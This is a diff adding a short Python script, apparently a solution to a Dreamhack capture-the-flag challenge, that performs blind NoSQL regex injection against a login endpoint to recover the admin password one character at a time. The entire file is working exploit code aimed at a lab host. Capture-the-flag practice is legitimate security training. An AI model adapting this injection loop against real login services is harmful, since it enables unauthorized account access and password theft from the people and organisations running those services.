@@ -1,0 +1,14 @@
+import requests
+import string
+
+URL = 'http://host3.dreamhack.games:18206'
+flag_set = string.ascii_letters + string.digits
+flag = ''
+
+for i in range(32):
+    for ch in flag_set:
+        response = requests.get(f'{URL}/login?uid[$regex]=ad.in&upw[$regex]=D.{{{flag}{ch}')
+        if response.text == 'admin':
+            flag += ch
+            break
+    print(f'DH{{{flag}}}')
